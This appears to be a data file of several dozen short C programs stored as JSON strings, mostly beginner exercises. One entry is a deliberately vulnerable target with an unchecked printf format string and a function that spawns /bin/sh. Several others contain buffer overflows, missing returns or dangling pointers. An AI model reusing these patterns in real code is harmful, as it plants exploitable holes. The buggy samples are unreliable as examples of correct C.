    "#include <stdio.h>\n#include <string.h>\nint main(){\n char inputStr[10];\n printf(\"Enter a string\\n\");\n scanf(\"%s\", inputStr);\n printf(\"The length is %lu\\n\", strlen(inputStr));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main () {\n    int a[5];\n    int *p;\n    p = (int*) malloc(5 * sizeof(int));\n    p[0] = 3;\n    p[1] = 5;\n    p[2] = 7;\n    p[3] = 9;\n    p[4] = 11;\n    for (int i = 0; i < 5; i++) {\n        printf(\"p[%d]: %d\\n\", i, p[i]);\n        printf(\"p[%d]: %u\\n\", i, &p[i]);\n    }\n    free(p);\n    p = ((void*)0);\n}",
    "#include <stdio.h>\nint main () {\n double paidPrice = 45.5;\n int numberOfShares = 1000;\n double soldPrice = 56.9;\n double stockCommissionPaidPrice = paidPrice * .02 * numberOfShares;\n double stockCommissionSoldPrice = soldPrice * .02 * numberOfShares;\n double totalPaidPrice = numberOfShares * paidPrice;\n double totalSoldPrice = numberOfShares * soldPrice;\n double totalStockBrokerCommission = stockCommissionPaidPrice + stockCommissionSoldPrice;\n double profit = totalSoldPrice - totalPaidPrice - totalStockBrokerCommission;\n printf(\"The amount of money Joe paid for the stock is: $%.2f\\n\", totalPaidPrice);\n printf(\"The amount of commission Joe paid his broker when he bought the stock is: $%.2f\\n\", stockCommissionPaidPrice);\n printf(\"The amount that Joe sold the stock for is: $%.2f\\n\", totalSoldPrice);\n printf(\"The amount of commission Joe paid his broker when he sold the stock is: $%.2f\\n\", stockCommissionSoldPrice);\n printf(\"The amount of profit Joe made is: $%.2f\\n\", profit);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc, char *argv[]) {\n int n,m,x;\n    while (~scanf(\"%d%d\",&n,&m)){\n     if(n>m){\n      int t=m;\n      m=n;\n      n=t;\n  }\n  int se=0;\n  int so=0;\n  for(int i=n;i<=m;i++){\n   if(abs(i)%2==1)so=so+i*i*i;\n   else se=se+i*i;\n  }\n  printf(\"%d %d\\n\",se,so);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint nestedRecursion(int n){\n    if(n>100){\n        return n-10;\n    }\n    return nestedRecursion(nestedRecursion(n+11));\n}\nint main() {\n    printf(\"%d\", nestedRecursion(95));\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n static char buff[1024];\n int len;\n printf(\"Hello world!\\n\");\n while((len = fread(buff, 1, 1024, (stdin))) > 0) {\n  fwrite(buff, 1, len, (stdout));\n }\n fflush((stdout));\n return 0;\n}",
    "#include<stdio.h>\nint main(){\nint i;\nscanf(\"%d\",&i);\nint a;\na=0;\nswitch(i) {\n        case 12: a=a+30;\n        case 11: a=a+31;\n        case 10: a=a+30;\n        case 9: a=a+31;\n        case 8: a=a+31;\n        case 7: a=a+30;\n        case 6: a=a+31;\n        case 5: a=a+30;\n        case 4: a=a+31;\n        case 3: a=a+29;\n       case 2: {\n   a=a+31;\n  }\n        case 1: {\n   a=a;\n   break;\n  }\n        default: puts(\"Error: no such month in my calendar\"); break;\n}\nprintf(\"There are %d days before this month \\n\", a);\nreturn 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nuint32_t STATE[16];\nuint32_t outbuf[16];\nuint32_t ptr=0;\n\nvoid salsa20(uint32_t out[16],uint32_t in[16]) {\n  uint32_t i, x[16];\n  for (i = 0;i < 16;++i)\n    x[i] = in[i];\n  for (i = 20;i > 0;i -= 2) {\n    x[ 4] ^= (((x[ 0]+x[12]) << (7)) | ((x[ 0]+x[12]) >> (32 - (7)))); x[ 8] ^= (((x[ 4]+x[ 0]) << (9)) | ((x[ 4]+x[ 0]) >> (32 - (9))));\n    x[12] ^= (((x[ 8]+x[ 4]) << (13)) | ((x[ 8]+x[ 4]) >> (32 - (13)))); x[ 0] ^= (((x[12]+x[ 8]) << (18)) | ((x[12]+x[ 8]) >> (32 - (18))));\n    x[ 9] ^= (((x[ 5]+x[ 1]) << (7)) | ((x[ 5]+x[ 1]) >> (32 - (7)))); x[13] ^= (((x[ 9]+x[ 5]) << (9)) | ((x[ 9]+x[ 5]) >> (32 - (9))));\n    x[ 1] ^= (((x[13]+x[ 9]) << (13)) | ((x[13]+x[ 9]) >> (32 - (13)))); x[ 5] ^= (((x[ 1]+x[13]) << (18)) | ((x[ 1]+x[13]) >> (32 - (18))));\n    x[14] ^= (((x[10]+x[ 6]) << (7)) | ((x[10]+x[ 6]) >> (32 - (7)))); x[ 2] ^= (((x[14]+x[10]) << (9)) | ((x[14]+x[10]) >> (32 - (9))));\n    x[ 6] ^= (((x[ 2]+x[14]) << (13)) | ((x[ 2]+x[14]) >> (32 - (13)))); x[10] ^= (((x[ 6]+x[ 2]) << (18)) | ((x[ 6]+x[ 2]) >> (32 - (18))));\n    x[ 3] ^= (((x[15]+x[11]) << (7)) | ((x[15]+x[11]) >> (32 - (7)))); x[ 7] ^= (((x[ 3]+x[15]) << (9)) | ((x[ 3]+x[15]) >> (32 - (9))));\n    x[11] ^= (((x[ 7]+x[ 3]) << (13)) | ((x[ 7]+x[ 3]) >> (32 - (13)))); x[15] ^= (((x[11]+x[ 7]) << (18)) | ((x[11]+x[ 7]) >> (32 - (18))));\n    x[ 1] ^= (((x[ 0]+x[ 3]) << (7)) | ((x[ 0]+x[ 3]) >> (32 - (7)))); x[ 2] ^= (((x[ 1]+x[ 0]) << (9)) | ((x[ 1]+x[ 0]) >> (32 - (9))));\n    x[ 3] ^= (((x[ 2]+x[ 1]) << (13)) | ((x[ 2]+x[ 1]) >> (32 - (13)))); x[ 0] ^= (((x[ 3]+x[ 2]) << (18)) | ((x[ 3]+x[ 2]) >> (32 - (18))));\n    x[ 6] ^= (((x[ 5]+x[ 4]) << (7)) | ((x[ 5]+x[ 4]) >> (32 - (7)))); x[ 7] ^= (((x[ 6]+x[ 5]) << (9)) | ((x[ 6]+x[ 5]) >> (32 - (9))));\n    x[ 4] ^= (((x[ 7]+x[ 6]) << (13)) | ((x[ 7]+x[ 6]) >> (32 - (13)))); x[ 5] ^= (((x[ 4]+x[ 7]) << (18)) | ((x[ 4]+x[ 7]) >> (32 - (18))));\n    x[11] ^= (((x[10]+x[ 9]) << (7)) | ((x[10]+x[ 9]) >> (32 - (7)))); x[ 8] ^= (((x[11]+x[10]) << (9)) | ((x[11]+x[10]) >> (32 - (9))));\n    x[ 9] ^= (((x[ 8]+x[11]) << (13)) | ((x[ 8]+x[11]) >> (32 - (13)))); x[10] ^= (((x[ 9]+x[ 8]) << (18)) | ((x[ 9]+x[ 8]) >> (32 - (18))));\n    x[12] ^= (((x[15]+x[14]) << (7)) | ((x[15]+x[14]) >> (32 - (7)))); x[13] ^= (((x[12]+x[15]) << (9)) | ((x[12]+x[15]) >> (32 - (9))));\n    x[14] ^= (((x[13]+x[12]) << (13)) | ((x[13]+x[12]) >> (32 - (13)))); x[15] ^= (((x[14]+x[13]) << (18)) | ((x[14]+x[13]) >> (32 - (18))));\n  }\n  for (i = 0;i < 16;++i) out[i] = x[i] + in[i];\n}\nuint32_t salsa(void) {\n  if(ptr==0) {\n    salsa20(outbuf, STATE);\n    (uint64_t)STATE[0]++;\n  }\n  ptr = (ptr+1) & 0xF;\n  return(outbuf[ptr]);\n}\nint main(void) {\n  uint32_t val, i;\n\n\n\n\n  uint32_t count = 537919488;\n  uint32_t offset = 0;\n\n  for(i=0; i<16; i++)\n    STATE[i] = (0xedababe5+(i+13))^(0xdeadbeef-i);\n  for(i=0; i<count; i++)\n    salsa();\n  val = salsa();\n  val += offset;\n  printf(\"got:       %x\\n\", val);\n  printf(\"should be: %x\\n\", 0xf655703d);\n  return(val != 0xf655703d);\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint main(void)\n{\n   int age, teenager;\n   printf(\"Enter your age: \");\n   scanf(\"%d\", &age);\n   teenager = age >= 13 && age <= 19;\n   printf(\"You are \");\n   if (teenager == 1)\n      printf(\"a teenager.\\n\");\n   else\n      printf(\"not a teenager.\\n\");\n   return 0;\n}",
    "#include <assert.h>\n#include <limits.h>\n#include <math.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    int no;\n    scanf(\"%d\", &no);\n    if(no == 1)\n        printf(\"one\");\n    else if (no == 2)\n        printf(\"two\");\n    else if (no == 3)\n        printf(\"three\");\n    else if (no == 4)\n        printf(\"four\");\n    else if (no == 5)\n        printf(\"five\");\n    else if (no == 6)\n        printf(\"six\");\n    else if (no == 7)\n        printf(\"seven\");\n    else if (no == 8)\n        printf(\"eight\");\n    else if (no == 9)\n        printf(\"nine\");\n    else if (no > 9)\n        printf(\"Greater than 9\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    unsigned char a, b;\n    scanf(\"%hhu %hhu\", &a, &b);\n    printf(\"%hhu\", a ^ b);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <sys/time.h>\ntypedef double data_t;\nstatic char* size_units[] = { \"B\", \"kB\", \"MB\", \"GB\" };\nstatic char* time_units[] = { \"ns\", \"us\", \"ms\", \"s\" };\nchar* transfer_size(size_t origin_size)\n{\n    char* transferred_size = (char*)malloc(10);\n    int unit_index = 0;\n    float size = origin_size;\n    while(size >= 1000)\n    {\n        size /= 1000;\n        unit_index++;\n    }\n    sprintf(transferred_size, \"%.1f%s\", size, size_units[unit_index]);\n    return transferred_size;\n}\nchar* transfer_time(double origin_time, int unit_index)\n{\n    if(unit_index < 0)\n    {\n        return ((void*)0);\n    }\n    int time = origin_time;\n    char* transferred_time = (char*)malloc(10);\n    while(time > 1000)\n    {\n        time /= 1000;\n        unit_index++;\n    }\n    sprintf(transferred_time, \"%.2f%s\", (double)time, time_units[unit_index]);\n    return transferred_time;\n}\ndata_t mount(data_t* data, size_t count, int stride)\n{\n    data_t result = 0;\n    for(size_t i = 0; i < count; i += stride)\n    {\n        result += data[i];\n    }\n    return result;\n}\nint main(int argc, char* argv[])\n{\n    if(argc != 3)\n    {\n        printf(\"Usage: %s <SIZE> <STRIDE>\\n\",argv[0]);\n        printf(\"Wallk an allcated memory buffer, generating read throughput results.\\n\");\n        printf(\"  <SIZE> is the byte size of buffer.\\n\");\n        printf(\"  <STRIDE> is the distance of two successive reads (in 64bit items).\\n\");\n        return 1;\n    }\n    int stride = atoll(argv[2]);\n    size_t size = atoll(argv[1]);\n    size_t count = size / sizeof(data_t);\n    data_t* data_array = (data_t*)malloc(size);\n    printf(\"size = %ju, stride=%d\\n\", size, stride);\n    double duration = 0;\n    int target_loop = 1;\n    while(1)\n    {\n        volatile data_t dummy=0;\n        dummy += mount(data_array, count, stride);\n        clock_t start_time = clock();\n        for(int i = 1; i < target_loop; i++)\n        {\n            dummy += mount(data_array, count, stride);\n        }\n        clock_t stop_time = clock();\n        duration = (uintmax_t)stop_time - (uintmax_t)start_time;\n        printf(\"%d repeats -> %s\\n\", target_loop, transfer_time(duration, 1));\n        if(target_loop > 1000)\n        {\n            break;\n        }\n        target_loop *= 10;\n    }\n    double duration_last_loop = duration / target_loop;\n    size_t quantity = (count/stride) * sizeof(data_t);\n    printf(\"Read %s bytes data in %s ms, speed is %.1f MB/s \\n\",\n           transfer_size(quantity),\n           transfer_time(duration_last_loop, 1),\n           ((float)quantity/duration_last_loop));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint divConqSearch(int A[], int n, int start, int end, int key)\n{\n if(start > end)\n  return -1;\n int mid = (start + end) / 2;\n if(key == A[mid])\n  return mid;\n if(key > A[mid])\n  divConqSearch(A, n, mid + 1, end, key);\n divConqSearch(A, n, 0, mid - 1, key);\n}\nvoid divConqInsert(int A[], int n, int key, int capacity)\n{\n if(n >= capacity)\n  return;\n int i;\n for(i = n - 1; (key < A[i] && i >= 0); i--)\n {\n  A[i + 1] = A[i];\n }\n A[i + 1] = key;\n}\nint main()\n{\n int A[10] = {1, 3, 5, 6, 7, 9};\n int n = sizeof(A)/sizeof(A[0]);\n int start = 0, end = n - 1;\n int key = 5;\n int sol = divConqSearch(A, n, start, end, key);\n sol == -1 ? printf(\"Sorry, key was not found!\\n\") : printf(\"They key was found and the index is: %d\\n\", sol);\n int capacity = sizeof(A)/sizeof(A[0]);\n divConqInsert(A, 6, 4, capacity);\n for(int i = 0; i < n + 1; i++)\n  printf(\"%d \", A[i]);\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n char ch[]=\"\";\n printf(\"input: \");\n scanf(\"%s\",ch);\n getchar();\n printf(\"%s --- %d\",ch,ch[3]);\n return 0;\n}",
    "#include <stdio.h>\nfloat celsius(float fahr);\nint main(void)\n{\n    float fahr;\n    float lower, upper, step;\n    lower = 0;\n    upper = 300;\n    step = 20;\n    fahr = lower;\n    while (fahr <= upper) {\n        printf(\"%3.0f %6.1f\\n\", fahr, celsius(fahr));\n        fahr = fahr + step;\n    }\n}\nfloat celsius(float fahr)\n{\n    return (5.0/9.0) * (fahr-32.0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\n#include <time.h>\nint main(int argc, char* argv[])\n{\n    time_t t;\n    char* str_time;\n    if (time(&t) < 0) {\n        fprintf((stderr), \"Err.(%s) getting time()\\n\", strerror(errno));\n        exit(1);\n    }\n    if ((str_time = ctime(&t)) == ((void*)0)) {\n        fprintf((stderr), \"Err.(%s) str conversion: ctime()\\n\", strerror(errno));\n        exit(1);\n    }\n    printf(\"%s\", str_time);\n    return (0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n double income;\n int select, dependents = 0, children = 0, deduction = 0;\n double tax = 0;\n printf(\"Enter your annual income: \");\n scanf(\"%lf\", &income);\n if (income < 9350)\n {\n  printf(\"0\\n\");\n  exit(0);\n }\n printf(\"What is your filing status? \\n1) single\\n2) married filing jointly\\n3) married filing separately\\nPlease enter a number: \");\n scanf(\"%d\", &select);\n switch (select)\n {\n case 1:\n case 3:\n  dependents = 1;\n  deduction = 5700;\n  break;\n case 2:\n  deduction = 11400;\n  dependents = 2;\n  break;\n default:\n  printf(\"The option you entered is incorrect\\n\");\n  exit(1);\n }\n if (dependents > 1)\n {\n  printf(\"How many children do you have? \");\n  scanf(\"%d\", &children);\n }\n deduction += (children + dependents) * 3650;\n income -= deduction;\n if (income >= 137300)\n {\n  printf(\"%.2lf\\n\", (income - 137300) * 0.28 + 26687.5);\n }\n else if (income >= 68000)\n {\n  printf(\"%.2lf\\n\", (income - 68000) * 0.25 + 9362.5);\n }\n else if (income >= 16750)\n {\n  printf(\"%.2lf\\n\", (income - 16750) * 0.15 + 1675);\n }\n else if (income >= 0)\n {\n  printf(\"%.2lf\\n\", income * 0.1);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n if (__builtin_expect(!!(argc % 2), 1))\n  printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\nint main(int argc, char *argv[]) {\nint fd = open(\"salida.txt\", (0x10000000)|(((__wasi_oflags_t)(1 << 0)) << 12), 0666);\ndup2(fd, 1);\nclose(fd);\nprintf(\"El muro de Trump!\\n\");\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    char c = 0xff;\n    if (c == 0xff)\n    {\n        printf(\"\\t\\nTruth\\n\\n\");\n    } else\n    {\n        printf(\"\\n\\tc = %d\\n\\tThis needs to be explained\\n\\n\", c);\n    }\n    return 0;\n}",
    "#include <stdlib.h>\nint main() {\n int* x0 = __builtin_alloca(sizeof(int));\n int* x1 = __builtin_alloca(sizeof(int));\n int* x2 = __builtin_alloca(sizeof(int));\n int* x3 = __builtin_alloca(sizeof(int));\n *x0 = 0;\n *x1 = 0;\n *x2 = 0;\n *x3 = 0;\n while ( *x3 == 0 ) {\n  if (*x0 == 0) {\n   *x0 = 1;\n  } else {\n   *x0 = 0;\n   if (*x1 == 0) {\n    *x1 = 1;\n   } else {\n    *x1 = 0;\n    if (*x2 == 0) {\n     *x2 = 1;\n    } else {\n     *x2 = 0;\n     *x3 = 1;\n    }\n   }\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"Hello World\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char names[23];\n    int i = 0;\n    printf(\"\\n Please Enter any String  :  \");\n    scanf(\"%s\", names);\n    while (names[i] != '\\0')\n    {\n        printf(\"%c\",names[i]);\n        i++;\n    }\n    printf(\"\\n\");\n    char class[10]=\"B5\";\n    printf(\"%s\",class);\n    return 0;\n}",
    "int s = 5;\nint foo1(int *a, int *b, int *c, int *d, int *e) {\n  return s + *a + *b + *c + *d + *e;\n}\nint foo2(int *a, int *b, int *c, int *d) {\n  int e = 5;\n  return foo1(a, b, c, d, &e);\n}\nint foo3(int *a, int *b, int *c) {\n  int d = 5;\n  return foo2(a, b, c, &d);\n}\nint foo4(int *a, int *b) {\n  int c = 5;\n  return foo3(a, b, &c);\n}\nint foo5(int *a) {\n  int b = 5;\n  return foo4(a, &b);\n}\nint foo6() {\n  int a = 5;\n  return foo5(&a);\n}\nint main() {\n  return foo6();\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    int vet[10];\n    int n, i, qtdvezes = 0;\n    for (i = 0; i < 10; i++)\n    {\n        printf(\"Informe o %d\u00ba valor: \", i + 1);\n        scanf(\"%d\", &vet[i]);\n    }\n    printf(\"Informe o numero a ser descoberto\\n\");\n    scanf(\"%d\", &n);\n    for (i = 0; i < 10; i++)\n    {\n        if (vet[i] == n)\n        {\n            qtdvezes++;\n        }\n    }\n    printf(\"A quantidade de vezes que o numero %d aparece \u00e9: %d\\n\", n, qtdvezes);\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdlib.h>\n#include <stdio.h>\nint main(void)\n{\n    int fd[2];\n    if ((pipe(fd)) < 0) {\n        perror(\"pipe\");\n        exit(1);\n    }\n    printf(\"descirptors are %d, %d\\n\", fd[0], fd[1]);\n    close(fd[0]);\n    close(fd[1]);\n    exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint main(int argc, char *argv[])\n{\n    int i, reps = 5, num;\n    FILE *stream;\n    if (argc > 1) {\n        int result = sscanf(argv[1], \"%d\", &reps);\n        if (result < 1 || reps < 1) {\n            fprintf((stderr), \"Invalid number of repetitions provided at the command line.\\n\");\n            exit(1);\n        }\n    }\n    stream = fopen(\"output.txt\", \"w\");\n    if (stream == ((void*)0)) {\n        fprintf((stderr), \"Failed to open %s for writing.\\n\", \"output.txt\");\n        exit(1);\n    }\n    fprintf(stream, \"1 \");\n    fclose(stream);\n    for (i = 0; i < reps-1; i++) {\n        stream = fopen(\"output.txt\", \"r+\");\n        if (stream == ((void*)0)) {\n            fprintf((stderr), \"Failed to open %s for reading and writing.\\n\", \"output.txt\");\n            exit(1);\n        }\n        while (!feof(stream)) {\n            fscanf(stream, \"%d\", &num);\n        }\n        fprintf(stream, \"%d \", num+1);\n        fclose(stream);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int num;\n    int counter = 0;\n    int tab[100];\n    int i = 0;\n    while(scanf(\" %d\", &num) != (-1) && counter != 3){\n        tab[i] = num;\n        printf(\"%d\\n\", tab[i]);\n        if(i > 0 && tab[i] != tab[i - 1] && tab[i] == 42) counter++;\n        i++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid merge(int a[], int lo, int mid, int hi){\n int i = lo, j = mid+1;\n int aux[10];\n for (int k = lo; k <= hi; ++k)\n  aux[k] = a[k];\n for (int k = lo; k <= hi; ++k){\n  if (i > mid) a[k] = aux[j++];\n  else if (j > hi) a[k] = aux[i++];\n  else if (aux[j] < aux[i]) a[k] = aux[j++];\n  else a[k] = aux[i++];\n }\n}\nvoid sort_down(int a[], int lo, int hi){\n if (lo<hi){\n  int mid = lo + (hi-lo)/2;\n  sort_down(a, lo, mid);\n  sort_down(a, mid+1, hi);\n  merge(a,lo,mid,hi);\n }\n}\nvoid sort_up(int a[],int N){\n for (int size = 2; size/2 < N; size*=2)\n  for (int lo=0; lo < N; lo+=size)\n   merge(a,lo,lo+size/2-1,(lo+size-1<N-1 ? lo+size-1 : N-1));\n}\nint main(void){\n int a[10] = {3,4,6,78,11,2,6,54,0,32};\n int b[10] = {3,4,6,78,11,2,6,54,0,32};\n sort_down(a,0,9);\n sort_up(b,10);\n for (int i=0;i<10;++i)\n  printf(\"%d \",a[i]);\n putchar('\\n');\n for (int i=0;i<10;++i)\n  printf(\"%d \",b[i]);\n putchar('\\n');\n return 0;\n}",
    "#include <ctype.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar *ualphabet = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\nchar *lalphabet = \"abcdefghijklmnopqrstuvwxyz\";\nchar *rot26(char *dst, char *src, size_t n)\n{\n int i, x;\n for (i = 0; i < n; i++) {\n  if ((0 ? isupper(src[i]) : ((unsigned)(src[i])-'A') < 26)) {\n   x = ualphabet[((src[i] - 'A') + 26) % strlen(ualphabet)];\n  } else if ((0 ? islower(src[i]) : ((unsigned)(src[i])-'a') < 26)) {\n   x = lalphabet[((src[i] - 'a') + 26) % strlen(lalphabet)];\n  } else {\n   x = src[i];\n  }\n  dst[i] = x;\n }\n}\nvoid winners_room(void)\n{\n puts(\"Please, take a shell!\");\n system(\"/bin/sh\");\n exit(0);\n}\nint main(void)\n{\n char buf[4096];\n char sanitized[4096];\n setbuf((stdout), ((void*)0));\n setbuf((stdin), ((void*)0));\n setbuf((stderr), ((void*)0));\n fgets(buf, sizeof(buf), (stdin));\n rot26(sanitized, buf, sizeof(sanitized));\n printf(sanitized);\n exit(1);\n}",
    "int main() {}",
    "#include <stdlib.h>\n#include <stdio.h>\nvoid clear_stdin(void);\nint main(void) {\n   int n;\n   char c;\n   printf(\"%s\",\"Donnez un nombre entier et un caractere : \");\n   scanf(\"%d %c\", &n, &c);\n   clear_stdin();\n   printf(\"n = %d\\n\", n);\n   printf(\"c = %c\\n\", c);\n   return 0;\n}\nvoid clear_stdin(void) {\n   int c;\n   do {\n      c = getchar();\n   } while (c != '\\n' && c != (-1));\n}",
    "#include <stdio.h>\n\nint main()\n{\n int tomb[10];\n int i, j;\n printf(\"Kerem a tomb elemeit:\\n\");\n for (i=0; i<10; i++)\n {\n  scanf(\"%d\", &tomb[i]);\n }\n int min_idx;\n int csere;\n for (i=0; i<10 -1; i++)\n {\n  min_idx=i;\n  for (j=i+1; j<10; j++)\n  {\n   if (tomb[j]<tomb[min_idx])\n    min_idx=j;\n  }\n  if (min_idx!=i)\n  {\n   csere=tomb[i];\n   tomb[i]=tomb[min_idx];\n   tomb[min_idx]=csere;\n  }\n }\n int kicsi[10/2], nagy[(10 +1)/2];\n for (i=0; i<10/2; i++)\n {\n  kicsi[i]=tomb[i];\n }\n for (i=0; i<(10 +1)/2; i++)\n {\n  nagy[i]=tomb[10 -i-1];\n }\n printf(\"A kisebb elemek:\\n\");\n for (i=0; i<10/2; i++)\n {\n  printf(\"%d \", kicsi[i]);\n }\n printf(\"\\nA nagyobb elemek:\\n\");\n for (i=0; i<(10 +1)/2; i++)\n {\n  printf(\"%d \", nagy[i]);\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n    float media;\n    int i;\n    for(i=1; i <= 4; i++){\n        printf(\"Digite a media dos alunos %d: \",i);\n        scanf(\"%f\", &media);\n        if(media < 0 || media > 10){\n            printf(\"ERRO!\\n\");\n        }\n        if(media < 5){\n            printf(\"Aluno Reprovado\\n\");\n        }\n        else{\n            printf(\"Aluno Aprovado\\n\");\n        }\n    }\nreturn 0;\n}",
    "#include <stdio.h>\nint main(int argc, const char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: %s <file>\\n\", argv[0]);\n        return 1;\n    }\n    FILE *fp = fopen(argv[1], \"r\");\n    if (fp == ((void*)0)) {\n        perror(argv[1]);\n        return 1;\n    }\n    char buf[256];\n    int size = fread(buf, sizeof(char), sizeof(buf), fp);\n    do {\n        for (int i = 0; i < size; i++)\n            putchar(buf[i]);\n        size = fread(buf, sizeof(char), sizeof(buf), fp);\n    }while (size > 0);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n  int c, i, lim = 1000;\n  char s[1000];\n  for (i = 0; i < lim - 1; ++i)\n  {\n    if ((c = getchar()) == '\\n')\n    {\n      break;\n    }\n    if (c == (-1))\n    {\n      break;\n    }\n    s[i] = c;\n  }\n  printf(\"%s\\n\", s);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int burst_time[20], process[20], wait_time[20], turnaround_time[20], i, j, n, total = 0, pos, temp;\n    float avg_wait_time = 0, avg_turnaround_time = 0;\n    printf(\"Enter number of process:\");\n    scanf(\"%d\", &n);\n    printf(\"\\nEnter Burst Time:\\n\");\n    for (i = 0; i < n; i++)\n    {\n        printf(\"p%d:\", i + 1);\n        scanf(\"%d\", &burst_time[i]);\n        process[i] = i + 1;\n    }\n    for (i = 0; i < n; i++)\n    {\n        pos = i;\n        for (j = i + 1; j < n; j++)\n        {\n            if (burst_time[j] < burst_time[pos])\n                pos = j;\n        }\n        temp = burst_time[i];\n        burst_time[i] = burst_time[pos];\n        burst_time[pos] = temp;\n        temp = process[i];\n        process[i] = process[pos];\n        process[pos] = temp;\n    }\n    for (i = 0; i < n; i++)\n    {\n        wait_time[i] = total;\n        total = total + burst_time[i];\n        turnaround_time[i] = burst_time[i] + wait_time[i];\n        avg_wait_time += wait_time[i];\n        avg_turnaround_time += turnaround_time[i];\n    }\n    printf(\"Process|  Burst Time  |  Waiting time  |  TurnAround Time\\n\");\n    for (i = 0; i < n; i++)\n    {\n        printf(\"%d\\t\\t\\t%d\\t\\t\\t%d\\t\\t\\t%d\\n\", process[i], burst_time[i], wait_time[i], turnaround_time[i]);\n    }\n    printf(\"Avg Waiting time:: %.3f\\n\", avg_wait_time / n);\n    printf(\"Avg TurnAround time:: %.3f\\n\", avg_turnaround_time / n);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int x;\n    float y;\n    scanf(\"%d %f\", &x, &y);\n    printf(\"%.3f km/l\\n\", x / y);\n    return 0;\n}",
    "#include <stdio.h>\nunsigned long long Fatorial(int num){\n    unsigned long long fatorial = 1;\n    int i;\n    for (i = num; i >= 2; i--)\n    {\n        fatorial *= i;\n    }\n    return fatorial;\n}\nint main(){\n    int num_1, num_2;\n    while(scanf(\"%d %d\", &num_1, &num_2) != (-1))\n    {\n        printf(\"%llu\\n\", Fatorial(num_1) + Fatorial(num_2));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <malloc.h>\nvoid change_value(int **p) {\n    int a = 2;\n    *p = &a;\n    printf(\"*p_ in change_value(): %i\\n\", **p);\n}\nvoid allocate_memeory(int **p) {\n    *p = malloc(sizeof (int));\n}\nint main() {\n    int *p = malloc(sizeof (int));\n    printf(\"p_: %p_\\n\", p);\n    *p = 5;\n    free(p);\n    printf(\"p_: %p_\\n\", p);\n    change_value(&p);\n    printf(\"*p_ in main(): %i\\n\", *p);\n    printf(\"p_: %p_\\n\", p);\n    int *ptr = ((void*)0);\n    printf(\"ptr: %p_\\n\", ptr);\n    printf(\"&ptr: %p_\\n\", &ptr);\n    allocate_memeory(&ptr);\n    printf(\"ptr: %p_\\n\", ptr);\n    printf(\"&ptr: %p_\\n\", &ptr);\n    free(ptr);\n    void (*func_ptr)(int **p);\n    func_ptr = allocate_memeory;\n    printf(\"Address of the allocate_memeory(): %p_\\n\", func_ptr);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int numberOfCases;\n    scanf(\"%d\", &numberOfCases);\n    for (int i = 0; i < numberOfCases; i++) {\n        int size;\n        scanf(\"%d\", &size);\n        int container[size];\n        for (int j = 0; j < size; j++) {\n            int num;\n            scanf(\" %d\", &num);\n            container[j] = num;\n        }\n        for (int q = 1; q < size; q += 2) {\n            printf(\"%d \", container[q]);\n        }\n        for (int h = 0; h < size; h += 2) {\n            printf(\"%d \", container[h]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "int main(void) {\n  int x = 0;\n  if (x) {\n    return 1;\n  } else {\n    return 2;\n  }\n  1/0;\n  return 1;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int x = 2;\n    switch (x)\n    {\n        case 1: printf(\"our choice is 1\\n\");\n        case 2: printf(\"our choice is 2\\n\");\n        case 3: printf(\"our choice is 3\\n\");\n        default: printf(\"choice other than 1, 2 and 3\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int A,B, SOMA;\n scanf(\"%d %d\", &A, &B);\n SOMA=A+B;\n printf(\"SOMA = %d\\n\", SOMA);\n return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main(int argc, const char **argv) {\n    pid_t pid;\n    if (0 == (pid = fork())) {\n        chdir(\"/\");\n        setsid();\n        fclose((stdin));\n        fclose((stdout));\n        fclose((stderr));\n        while(1) {}\n    } else {\n        printf(\"%d\\n\", pid);\n    }\n    return 0;\n}",
    "char a[10] = { 'a', 65 };\nextern void write(int, char *, int);\nint main() {\n    write(1, a, 2);\n    return a[3];\n}",
